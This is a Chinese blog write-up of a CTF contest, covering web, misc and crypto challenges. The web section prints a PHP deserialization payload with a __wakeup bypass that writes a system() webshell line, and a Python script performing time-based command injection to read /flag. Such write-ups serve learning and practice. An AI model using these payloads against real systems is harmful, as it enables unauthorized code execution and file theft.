---
title: 两小时AK赛
date: 2022-07-01 20:31:52
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

**catf1ag之前的一个比赛，当时因为一些原因没法进行，今天把比赛题复盘一下**

<!--more-->

# web

## 签到了!!!你会玩2048么?

f12看到flag

## easy_unser

- __wakeup绕过序列化漏洞 

```
<?php
//flag in /flag
show_source('./index.php');
class catf1ag{
    public $target='flag';
    function __wakeup(){
        $this->target = "catf1ag is CTF platform!";
    }
    function __destruct(){
        $fp = fopen("catf1ag.php","w");
        fputs($fp,$this->target);
        fclose($fp);
    }
}
$a = $_GET['catf1ag'];
$b = unserialize($a);
include 'catf1ag.php';

?>
flag
```

直接序列化![image-20220701185353173](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011855603.png?x-oss-process=hzy)

```

O:7:"catf1ag":1:{s:6:"target";s:4:"flag";}
```

如果存在_wakeup函数，那在调用反序列化方法前会先调用wakeup函数，绕过方法就是让序列化字符串中表示对象属性个数的值大于真实的属性个数！

按照上面的思路来做，就是构造大于代码中的属性，catf1ag的属性的个数值改成2，然后通过target读取flag

```
O:7:"catf1ag":2:{s:6:"target";s:28:"<?php system('cat /flag');?>";}
```

![image-20220701190608256](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011906358.png?x-oss-process=hzy)

## 你猜猜是什么注入?

- 时间注入

![image-20220701191518661](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011915782.png?x-oss-process=hzy)

sql注入不拿手啊，我太菜，这道题不是自己写出来的，借鉴了大佬的wp

[(44条消息) catf1ag平台AK赛_想成菜鸡的武阳的博客-CSDN博客](https://blog.csdn.net/weixin_53268624/article/details/124680581)

放个exp吧

```
import requests
import time
# s = ""
# for i in range(32,128):
#     s += chr(i)
s = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = ""
for i in range(1,50):
    for j in s:
        url = "http://d4662749-0226-4146-826f-84e60e719800.subject.catf1ag.cn:9999//?catf1ag=" + f"sleep `cat /flag | cut -c {i} | tr {j} 2`"
        try:
            print(url)
            requests.adapters.DEFAULT_RETRIES = 5 # 增加重连次数
            requests.get(url,timeout=2)
        except Exception as e:
            print(str(e))
            flag += j
            print(flag)
            break
        time.sleep(2)
print(flag)
```

![image-20220701193311315](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011933437.png?x-oss-process=hzy)

# MISC

## 签签

拖到010看看发现有base64加密内容![image-20220701192059618](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011920716.png?x-oss-process=hzy)

解码得到flag

![image-20220701192137821](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011921989.png?x-oss-process=hzy)

## 奇怪的字符

附件内容是

```
bcwb4g`slyLMb?ftR~qh
```

异或，写个脚本

```
data = open('secret.txt','r').read()
a = 1
for i in data:
    print(chr(ord(i)^a),end='')
    #把txt文件内容中的字符转换成进制 每位与a递增异或，再重新转成字符
    a+=1
```

![image-20220701192419954](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011924011.png?x-oss-process=hzy)

## 这4什么好看的

这个不会，大佬带带我，不会的就不写了

# CRYPTO

### 怎么会多一个呢

附件内容是

```
n=73551482761993440116378276402850976017673970117685879384712768054097267028974244867004238587658366463106703581107613883463180833706377915593443986550610497954246664378469651
e=65537
c=19088340804936031145050310701046663800140062626102387290922890724239533128878474005542684734507475562997222905703018409354867816494925059525377106444000231776165581716296665
```

exp如下

```
import libnum
import gmpy2
 
 
n=73551482761993440116378276402850976017673970117685879384712768054097267028974244867004238587658366463106703581107613883463180833706377915593443986550610497954246664378469651
e=65537
c=19088340804936031145050310701046663800140062626102387290922890724239533128878474005542684734507475562997222905703018409354867816494925059525377106444000231776165581716296665
 
p = 4254843227
q = 2492374307
r = 6935768738605665705725288400892432256194550668863095515013942769049162888322407038880737120756913240675144540329112141837524407303580284917764285456453059
phi_n=(p-1)*(q-1)*(r-1)
d=gmpy2.invert(e,phi_n)
m=pow(c,d,n)
print(m)
print(libnum.n2s(int(m)))
```

![image-20220701193530540](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011935659.png?x-oss-process=hzy)

其他的解密我也不擅长，就不写了，先主攻web